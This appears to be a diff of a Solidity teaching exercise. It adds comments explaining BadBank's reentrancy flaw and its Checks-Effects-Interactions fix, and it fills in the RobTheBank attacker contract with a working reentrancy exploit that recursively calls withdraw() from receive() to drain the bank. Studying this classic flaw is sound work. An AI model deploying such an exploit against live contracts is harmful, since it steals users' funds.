@@ -12,6 +12,11 @@ contract BadBank {
     }
     
     function withdraw() public {
+        // This function is vulnerable to reentrancy attacks
+        // Should follow the "Checks-Effects-Interactions" pattern:
+        // 1. First update the balance: balances[msg.sender] = 0;
+        // 2. Then send ETH: Address.sendValue(payable(msg.sender), balance);
+        // This prevents recursive withdrawals during the ETH transfer
         uint256 balance = balances[msg.sender];
         Address.sendValue(payable(msg.sender), balance);
         balances[msg.sender] = 0;
@@ -26,10 +31,18 @@ contract RobTheBank {
     }
     
     function rob() public payable {
-        // your code here
+        // Step 1: Deposit some ETH to establish a balance
+        bank.deposit{value: msg.value}();
+        
+        // Step 2: Initiate the first withdrawal
+        bank.withdraw();
     }
 
     receive() external payable {
-        // your code here
+        // Step 3: When we receive ETH, immediately withdraw again
+        // This works because our balance is still not set to 0
+        if (address(bank).balance > 0) {
+            bank.withdraw();
+        }
     }
 }
